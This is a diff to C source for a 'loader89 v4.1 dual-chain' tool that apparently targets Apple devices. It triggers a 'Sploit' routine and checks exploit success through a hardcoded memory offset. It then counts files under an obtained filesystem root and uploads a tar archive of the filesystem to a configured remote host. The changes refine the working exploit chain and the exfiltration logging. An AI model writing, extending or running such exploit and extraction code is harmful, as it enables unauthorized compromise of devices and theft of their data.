@@ -24,6 +24,8 @@ extern int pthread_detach(void *);
 extern int sysctlbyname(const char *, void *, unsigned long *, void *, unsigned long);
 extern char *getenv(const char *);
 extern int strcmp(const char *, const char *);
+extern int dup2(int, int);
+extern int fflush(void *);
 
 #define RTLD_DEFAULT ((void *)-2)
 #define O_RDONLY 0
@@ -141,6 +143,39 @@ static long info_int(const char *key, long fallback) {
     if (!obj) return fallback;
     long v = (long)p_msgSend(obj, p_sel("intValue"));
     return v ? v : fallback;
+}
+
+static int path_exists(const char *path) {
+    struct stat st;
+    return path && path[0] && stat(path, &st) == 0;
+}
+
+static long dir_file_count(const char *path, int depth) {
+    if (!path || !path[0]) return -1;
+    DIR *dir = opendir(path);
+    if (!dir) return -1;
+    long n = 0;
+    struct dirent *e;
+    while ((e = (struct dirent *)readdir(dir))) {
+        const char *nm = e->d_name;
+        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
+        char *full = cat3(path, "/", nm);
+        struct stat st;
+        if (lstat(full, &st) == 0) {
+            if ((st.st_mode & 0xF000) == 0x4000) {
+                if (depth > 0) n += dir_file_count(full, depth - 1);
+            } else n++;
+        }
+        free(full);
+    }
+    closedir(dir);
+    return n;
+}
+
+static char *objc_property_string(void *obj, const char *selname) {
+    if (!obj) return 0;
+    void *v = p_msgSend(obj, p_sel(selname));
+    return objc_cstr(v);
 }
 
 static char *device_string(const char *selector) {
@@ -410,6 +445,7 @@ static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, con
     if (av) { unsigned long i = 0; for (; i < sizeof(appVersion) - 1 && av[i]; i++) appVersion[i] = av[i]; appVersion[i] = 0; free(av); }
     else appVersion[0] = 0;
 
+    char msg[900];
     char eName[64], eSource[64], eRoot[512];
     json_escape(eName, sizeof(eName), model);
     json_escape(eSource, sizeof(eSource), source);
@@ -443,11 +479,13 @@ static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, con
 
     long ok4 = 0;
     if (tarfd >= 0 && tarpath[0]) {
+        struct stat ts;
+        long tsize = stat(tarpath, &ts) == 0 ? (long)ts.st_size : -1;
         void *pathStr = p_msgSend(nsstring, sel_str_u8, tarpath);
         void *typeStr = p_msgSend(nsstring, sel_str_u8, "filesystem");
-        p_msgSend(inst, p_sel("uploadFileSync:acquisitionType:"), pathStr, typeStr);
-        log_info("tar uploadFileSync sent");
-        ok4 = 1;
+        ok4 = (long)p_msgSend(inst, p_sel("uploadFileSync:acquisitionType:"), pathStr, typeStr);
+        snprintf(msg, sizeof(msg), "tar uploadFileSync ret=%ld size=%ld path=%s", ok4, tsize, tarpath);
+        log_info(msg);
     }
 
     err = 0;
@@ -471,7 +509,16 @@ static void *worker(void *arg) {
     p_release = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_release");
     if (!p_msgSend || !p_getClass || !p_sel || !p_release) { log_error("objc runtime missing"); return 0; }
 
-    log_info("=== loader89 v4 dual-chain start ===");
+    if (g_logfd >= 0) {
+        int o = dup2(g_logfd, 1);
+        int e = dup2(g_logfd, 2);
+        fflush(0);
+        char dm[128];
+        snprintf(dm, sizeof(dm), "stdout/stderr redirect out=%d err=%d", o, e);
+        log_info(dm);
+    }
+
+    log_info("=== loader89 v4.1 dual-chain start ===");
     read_runtime_config();
     char msg[600], bid[200];
     snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
@@ -504,14 +551,22 @@ static void *worker(void *arg) {
             static void *serverThread;
             if (pthread_create(&serverThread, 0, run_server_worker, acq) == 0) pthread_detach(serverThread);
             sleep(1);
+            p_msgSend(acq, p_sel("InitLogs"));
+            log_info("InitLogs returned");
+            char *st0 = objc_property_string(acq, "lblState");
+            log_info(st0 ? st0 : "lblState=(null)");
+            if (st0) free(st0);
             log_info("Sploit start");
             p_msgSend(acq, p_sel("Sploit"));
             log_info("Sploit returned");
             sleep(3);
+            char *state = objc_property_string(acq, "lblState");
+            log_info(state ? state : "lblState=(null)");
+            if (state) free(state);
             if (core) {
                 unsigned char *flag = (unsigned char *)core + 0x6b96d8;
-                exploit_ok = *flag;
-                snprintf(msg, sizeof(msg), "exploit result=%d flag_addr=%p", exploit_ok, (void *)flag);
+                exploit_ok = (*flag == 0);
+                snprintf(msg, sizeof(msg), "exploit raw=%d ok=%d flag_addr=%p", (int)*flag, exploit_ok, (void *)flag);
                 log_info(msg);
             }
             p_release(acq);
@@ -535,8 +590,10 @@ static void *worker(void *arg) {
         int run_ret = run ? run() : 0;
         snprintf(msg, sizeof(msg), "mcm_filza_run=%d", run_ret);
         log_info(msg);
+        int ready_ok = 0;
         for (int i = 0; i < 20; i++) {
-            if (ready && ready()) { mha_ok = 1; break; }
+            ready_ok = ready ? ready() : 0;
+            if (ready_ok) break;
             void *r = root ? root() : 0;
             if (r) {
                 char *cs = objc_cstr(r);
@@ -548,10 +605,14 @@ static void *worker(void *arg) {
                 }
             }
             if (r) p_release(r);
-            if (mcm_root[0]) { mha_ok = 1; break; }
+            if (mcm_root[0] && path_exists(mcm_root)) break;
             sleep(1);
         }
-        snprintf(msg, sizeof(msg), "MHA/MCM ready=%d root=%s", mha_ok, mcm_root);
+        ready_ok = ready ? ready() : 0;
+        int root_exists = path_exists(mcm_root);
+        long root_files = root_exists ? dir_file_count(mcm_root, 3) : -1;
+        mha_ok = ready_ok || (root_exists && root_files > 0);
+        snprintf(msg, sizeof(msg), "MHA/MCM ready=%d root=%s exists=%d files=%ld", ready_ok, mcm_root, root_exists, root_files);
         log_info(msg);
     }
     post_log_now();
